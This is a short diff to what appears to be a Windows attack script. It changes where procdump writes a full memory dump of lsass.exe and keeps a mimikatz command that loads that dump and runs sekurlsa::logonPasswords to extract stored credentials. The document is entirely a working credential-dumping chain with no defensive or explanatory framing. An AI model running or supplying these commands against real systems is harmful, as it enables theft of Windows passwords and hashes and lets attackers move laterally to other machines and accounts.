@@ -1,2 +1,2 @@
-procdump.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp 2>&1
+procdump.exe -accepteula -ma lsass.exe C:\Support\lsass.dmp 2>&1
 mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
